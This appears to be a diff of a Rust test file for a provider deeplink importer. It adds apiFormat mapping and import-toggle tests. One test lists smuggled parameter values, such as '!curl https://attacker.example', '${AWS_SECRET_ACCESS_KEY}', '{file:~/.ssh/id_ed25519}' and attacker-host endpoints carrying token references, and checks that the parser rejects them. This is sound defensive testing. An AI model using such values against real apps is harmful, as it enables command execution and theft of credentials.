@@ -88,9 +88,10 @@ fn test_parse_deeplink_with_notes() {
 }
 
 #[test]
-fn pi_provider_deeplink_is_not_a_second_add_provider_entry() {
-    let url = "ccswitch://v1/import?resource=provider&app=pi&name=Pi";
-    assert!(parse_deeplink_url(url).is_err());
+fn pi_provider_link_without_a_model_is_rejected_up_front() {
+    let url = "ccswitch://v1/import?resource=provider&app=pi&name=Pi&endpoint=https%3A%2F%2Fapi.example.com%2Fv1&apiKey=sk-test";
+    let err = parse_deeplink_url(url).expect_err("a Pi node without models is unusable");
+    assert!(err.to_string().contains("model"), "{err}");
 }
 
 #[test]
@@ -284,6 +285,7 @@ fn test_build_gemini_provider_with_model() {
         haiku_model: None,
         sonnet_model: None,
         opus_model: None,
+        api_format: None,
         config: None,
         config_format: None,
         config_url: None,
@@ -337,6 +339,7 @@ fn test_build_gemini_provider_without_model() {
         haiku_model: None,
         sonnet_model: None,
         opus_model: None,
+        api_format: None,
         config: None,
         config_format: None,
         config_url: None,
@@ -383,6 +386,7 @@ fn test_deeplink_usage_script_does_not_copy_provider_credentials() {
         haiku_model: None,
         sonnet_model: None,
         opus_model: None,
+        api_format: None,
         config: None,
         config_format: None,
         config_url: None,
@@ -430,6 +434,7 @@ fn usage_script_request(code: &str, usage_enabled: Option<bool>) -> DeepLinkImpo
         haiku_model: None,
         sonnet_model: None,
         opus_model: None,
+        api_format: None,
         config: None,
         config_format: None,
         config_url: None,
@@ -546,6 +551,7 @@ fn test_deeplink_usage_script_omits_explicit_credentials_that_match_provider() {
         haiku_model: None,
         sonnet_model: None,
         opus_model: None,
+        api_format: None,
         config: None,
         config_format: None,
         config_url: None,
@@ -594,6 +600,7 @@ fn test_deeplink_usage_script_preserves_distinct_usage_credentials() {
         haiku_model: None,
         sonnet_model: None,
         opus_model: None,
+        api_format: None,
         config: None,
         config_format: None,
         config_url: None,
@@ -647,6 +654,7 @@ fn test_parse_and_merge_config_claude() {
         haiku_model: None,
         sonnet_model: None,
         opus_model: None,
+        api_format: None,
         config: Some(config_b64),
         config_format: Some("json".to_string()),
         config_url: None,
@@ -770,6 +778,7 @@ fn test_parse_and_merge_config_url_override() {
         haiku_model: None,
         sonnet_model: None,
         opus_model: None,
+        api_format: None,
         config: Some(config_b64),
         config_format: Some("json".to_string()),
         config_url: None,
@@ -833,6 +842,7 @@ fn test_build_claude_provider_preserves_custom_env_fields() {
         haiku_model: Some("haiku-from-url".to_string()),
         sonnet_model: None,
         opus_model: None,
+        api_format: None,
         config: Some(config_b64),
         config_format: Some("json".to_string()),
         config_url: None,
@@ -888,6 +898,7 @@ fn test_build_claude_provider_without_config_unchanged() {
         haiku_model: None,
         sonnet_model: None,
         opus_model: None,
+        api_format: None,
         config: None,
         config_format: None,
         config_url: None,
@@ -1522,4 +1533,318 @@ fn test_grok_link_config_rejects_credential_providers_and_local_files() {
         let err = import_grok_with_config(&config).unwrap_err();
         assert!(err.to_string().contains(key), "{key}: {err}");
     }
+}
+
+// =============================================================================
+// apiFormat：一套取值，按应用换算
+// =============================================================================
+
+fn provider_link(app: &str, api_format: Option<&str>) -> String {
+    let mut url = format!(
+        "ccswitch://v1/import?resource=provider&app={app}&name=Example&endpoint=https%3A%2F%2Fapi.example.com%2Fv1&apiKey=sk-test&model=example-model"
+    );
+    if let Some(format) = api_format {
+        url.push_str(&format!("&apiFormat={format}"));
+    }
+    url
+}
+
+fn build_from_link(app: &str, api_format: Option<&str>) -> crate::provider::Provider {
+    use super::provider::build_provider_from_request;
+    let request = parse_deeplink_url(&provider_link(app, api_format)).expect("parse link");
+    let app_type: AppType = app.parse().expect("app type");
+    build_provider_from_request(&app_type, &request).expect("build provider")
+}
+
+#[test]
+fn test_api_format_maps_to_each_additive_apps_own_protocol_field() {
+    let cases = [
+        ("opencode", "npm", "anthropic", "@ai-sdk/anthropic"),
+        (
+            "opencode",
+            "npm",
+            "openai_chat",
+            "@ai-sdk/openai-compatible",
+        ),
+        ("opencode", "npm", "openai_responses", "@ai-sdk/openai"),
+        ("opencode", "npm", "gemini_native", "@ai-sdk/google"),
+        ("openclaw", "api", "anthropic", "anthropic-messages"),
+        ("openclaw", "api", "openai_responses", "openai-responses"),
+        ("openclaw", "api", "gemini_native", "google-generative-ai"),
+        ("hermes", "api_mode", "anthropic", "anthropic_messages"),
+        ("hermes", "api_mode", "openai_responses", "codex_responses"),
+        ("pi", "api", "anthropic", "anthropic-messages"),
+        ("pi", "api", "openai_responses", "openai-responses"),
+        ("pi", "api", "gemini_native", "google-generative-ai"),
+    ];
+    for (app, field, format, expected) in cases {
+        let provider = build_from_link(app, Some(format));
+        assert_eq!(
+            provider.settings_config[field], expected,
+            "{app} apiFormat={format}"
+        );
+    }
+}
+
+#[test]
+fn test_links_without_api_format_keep_each_apps_previous_protocol() {
+    let cases = [
+        ("opencode", "npm", "@ai-sdk/openai-compatible"),
+        ("openclaw", "api", "openai-completions"),
+        ("hermes", "api_mode", "chat_completions"),
+        ("pi", "api", "openai-completions"),
+    ];
+    for (app, field, expected) in cases {
+        let provider = build_from_link(app, None);
+        assert_eq!(provider.settings_config[field], expected, "{app}");
+    }
+    for app in ["claude", "codex", "grokbuild"] {
+        let provider = build_from_link(app, None);
+        assert!(
+            provider.meta.and_then(|meta| meta.api_format).is_none(),
+            "{app}: a link without apiFormat must not add meta.apiFormat"
+        );
+    }
+}
+
+#[test]
+fn test_api_format_marks_routed_formats_on_claude_codex_and_grok() {
+    for (app, format) in [
+        ("claude", "openai_chat"),
+        ("claude", "gemini_native"),
+        ("codex", "openai_chat"),
+        ("codex", "anthropic"),
+        ("grokbuild", "openai_chat"),
+    ] {
+        let provider = build_from_link(app, Some(format));
+        assert_eq!(
+            provider.meta.and_then(|meta| meta.api_format).as_deref(),
+            Some(format),
+            "{app} apiFormat={format}"
+        );
+    }
+}
+
+#[test]
+fn test_api_format_rejects_unknown_values_and_unsupported_apps() {
+    for (app, format) in [
+        ("claude", "openai"),
+        ("codex", "gemini_native"),
+        ("grokbuild", "gemini_native"),
+        ("gemini", "openai_chat"),
+        ("hermes", "gemini_native"),
+    ] {
+        let err = parse_deeplink_url(&provider_link(app, Some(format)))
+            .expect_err("unsupported apiFormat must be rejected while parsing");
+        assert!(
+            err.to_string().contains("apiFormat"),
+            "{app}/{format}: {err}"
+        );
+    }
+}
+
+#[test]
+fn test_pi_link_builds_a_models_json_node() {
+    let provider = build_from_link("pi", Some("anthropic"));
+    assert_eq!(
+        provider.settings_config,
+        serde_json::json!({
+            "name": "Example",
+            "baseUrl": "https://api.example.com/v1",
+            "apiKey": "sk-test",
+            "api": "anthropic-messages",
+            "models": [{ "id": "example-model", "name": "example-model" }],
+        })
+    );
+}
+
+// =============================================================================
+// enabled：确认框开关的值。累加式应用决定是否写进应用配置，不调用切换
+// =============================================================================
+
+fn import_pi_link(enabled: Option<bool>) -> (AppState, String) {
+    let mut request =
+        parse_deeplink_url(&provider_link("pi", Some("openai_chat"))).expect("parse link");
+    request.enabled = enabled;
+    let db = Arc::new(Database::memory().expect("create memory db"));
+    let state = AppState::new(db);
+    let id = super::import_provider_from_deeplink(&state, request).expect("import Pi provider");
+    (state, id)
+}
+
+#[test]
+#[serial_test::serial]
+fn test_pi_link_with_the_toggle_off_is_saved_without_touching_models_json() {
+    let _home = TestHomeGuard::new();
+    let _agent = crate::pi_config::test_support::TestAgentDir::new();
+
+    let (state, id) = import_pi_link(Some(false));
+
+    assert!(state.db.get_provider_by_id(&id, "pi").unwrap().is_some());
+    assert!(!crate::pi_config::pi_provider_exists(&id).unwrap());
+}
+
+#[test]
+#[serial_test::serial]
+fn test_pi_link_with_the_toggle_on_or_unset_is_added_to_models_json() {
+    let _home = TestHomeGuard::new();
+    let _agent = crate::pi_config::test_support::TestAgentDir::new();
+
+    for enabled in [Some(true), None] {
+        let (_state, id) = import_pi_link(enabled);
+        let node = crate::pi_config::read_pi_native_provider(&id)
+            .unwrap()
+            .expect("node written to models.json");
+        assert_eq!(node["api"], "openai-completions", "{enabled:?}");
+    }
+}
+
+// =============================================================================
+// 累加式应用会解释的写法：命令、环境变量、文件引用
+// =============================================================================
+
+fn link_with(app: &str, param: &str, raw_value: &str) -> String {
+    let base = provider_link(app, None);
+    let value: String = url::form_urlencoded::byte_serialize(raw_value.as_bytes()).collect();
+    // provider_link 已带 endpoint / apiKey / model，替换掉同名参数
+    let mut url = url::Url::parse(&base).unwrap();
+    let pairs: Vec<(String, String)> = url
+        .query_pairs()
+        .filter(|(key, _)| key != param)
+        .map(|(key, value)| (key.into_owned(), value.into_owned()))
+        .collect();
+    url.query_pairs_mut().clear().extend_pairs(pairs);
+    format!("{url}&{param}={value}")
+}
+
+#[test]
+fn test_links_that_smuggle_commands_env_vars_or_files_into_additive_apps_are_rejected() {
+    for (app, param, value) in [
+        ("pi", "apiKey", "!printf review-fixture"),
+        ("pi", "apiKey", "  !curl https://attacker.example"),
+        ("pi", "apiKey", "$OPENAI_API_KEY"),
+        ("pi", "apiKey", "${AWS_SECRET_ACCESS_KEY}"),
+        ("pi", "model", "${HOME}"),
+        ("opencode", "apiKey", "{file:~/.ssh/id_ed25519}"),
+        ("opencode", "apiKey", "{env:ANTHROPIC_API_KEY}"),
+        (
+            "opencode",
+            "endpoint",
+            "https://attacker.example/{env:GITHUB_TOKEN}",
+        ),
+        (
+            "openclaw",
+            "endpoint",
+            "https://attacker.example/${OPENAI_API_KEY}",
+        ),
+        ("openclaw", "apiKey", "${OPENAI_API_KEY}"),
+        ("hermes", "apiKey", "${ANTHROPIC_API_KEY}"),
+        ("hermes", "name", "${HOME}"),
+    ] {
+        let err = parse_deeplink_url(&link_with(app, param, value))
+            .expect_err("dynamic syntax must be rejected while parsing");
+        assert!(
+            err.to_string().contains(param),
+            "{app}/{param}={value}: {err}"
+        );
+    }
+}
+
+#[test]
+fn test_dynamic_syntax_guard_leaves_ordinary_values_alone() {
+    for (app, param, value) in [
+        ("pi", "apiKey", "sk-abc$1def"),
+        ("pi", "apiKey", "sk-ends-with-!"),
+        ("opencode", "apiKey", "sk-{not-a-reference}"),
+        // 切换式应用的客户端不展开这些写法，照常导入
+        ("claude", "apiKey", "!literal-key"),
+        ("codex", "apiKey", "${literal}"),
+    ] {
+        parse_deeplink_url(&link_with(app, param, value))
+            .unwrap_or_else(|err| panic!("{app}/{param}={value} should parse: {err}"));
+    }
+}
+
+#[test]
+fn test_dynamic_syntax_guard_also_covers_values_from_config_and_direct_requests() {
+    use super::provider::build_provider_from_request;
+
+    // config 里补来的 Key 在合并时就拒绝
+    let config = BASE64_STANDARD.encode(r#"{"apiKey":"{file:~/.aws/credentials}"}"#);
+    let url = format!(
+        "ccswitch://v1/import?resource=provider&app=opencode&name=Example&endpoint=https%3A%2F%2Fapi.example.com%2Fv1&model=m&config={config}"
+    );
+    let request = parse_deeplink_url(&url).expect("URL params themselves are fine");
+    assert!(parse_and_merge_config(&request).is_err());
+
+    // 前端可以直接把请求发给导入命令，不经过解析器：构建时还要再查一次
+    let request = DeepLinkImportRequest {
+        resource: "provider".to_string(),
+        app: Some("pi".to_string()),
+        name: Some("Example".to_string()),
+        endpoint: Some("https://api.example.com/v1".to_string()),
+        api_key: Some("!printf review-fixture".to_string()),
+        model: Some("m".to_string()),
+        ..Default::default()
+    };
+    assert!(build_provider_from_request(&AppType::Pi, &request).is_err());
+}
+
+// =============================================================================
+// 切换式应用关掉「导入后立即切换」：只存进列表，即使还没有当前供应商
+// =============================================================================
+
+fn import_claude_link(enabled: Option<bool>) -> (AppState, String) {
+    let mut request = parse_deeplink_url(&provider_link("claude", None)).expect("parse link");
+    request.enabled = enabled;
+    let db = Arc::new(Database::memory().expect("create memory db"));
+    let state = AppState::new(db);
+    let id = super::import_provider_from_deeplink(&state, request).expect("import provider");
+    (state, id)
+}
+
+#[test]
+#[serial_test::serial]
+fn test_first_switch_mode_provider_stays_inactive_when_the_toggle_is_off() {
+    let _home = TestHomeGuard::new();
+
+    for enabled in [Some(false), None] {
+        let (state, id) = import_claude_link(enabled);
+
+        assert!(state
+            .db
+            .get_provider_by_id(&id, "claude")
+            .unwrap()
+            .is_some());
+        let current = crate::mode::current::provider_for(
+            &state.db,
+            &AppType::Claude,
+            crate::mode::current::Purpose::Direct,
+        )
+        .unwrap();
+        assert_eq!(current, None, "{enabled:?}: must not become current");
+        assert!(
+            !crate::config::get_claude_settings_path().exists(),
+            "{enabled:?}: the client config must not be written"
+        );
+    }
+}
+
+#[test]
+#[serial_test::serial]
+fn test_first_switch_mode_provider_takes_effect_when_the_toggle_is_on() {
+    let _home = TestHomeGuard::new();
+
+    let (state, id) = import_claude_link(Some(true));
+
+    let current = crate::mode::current::provider_for(
+        &state.db,
+        &AppType::Claude,
+        crate::mode::current::Purpose::Direct,
+    )
+    .unwrap();
+    assert_eq!(current.as_deref(), Some(id.as_str()));
+    let settings = std::fs::read_to_string(crate::config::get_claude_settings_path())
+        .expect("client config written");
+    assert!(settings.contains("https://api.example.com/v1"));
 }
